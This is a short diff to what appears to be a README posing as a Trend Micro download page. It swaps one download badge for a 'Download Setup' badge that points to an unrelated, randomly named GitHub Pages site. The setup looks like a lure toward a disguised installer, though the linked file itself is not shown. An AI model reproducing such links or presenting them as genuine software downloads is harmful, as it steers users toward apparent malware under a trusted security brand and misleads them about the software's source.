@@ -4,11 +4,7 @@
 <img src="https://i.pcmag.com/imagery/reviews/06d3I25IvG8sG3Fdi0El2fq-30.fit_scale.size_400x225.v1740064305.png" alt="Trend Micro Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://tomagsvi9.github.io/.github/trendmicro">  
-<img src="https://img.shields.io/badge/🔒_Get_Trend_Micro-crimson?style=for-the-badge&logo=apple" alt="Trend Micro">  
-</a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://tymaddenfjzo.github.io/.github/Trend-Micro)
 
 ---
 
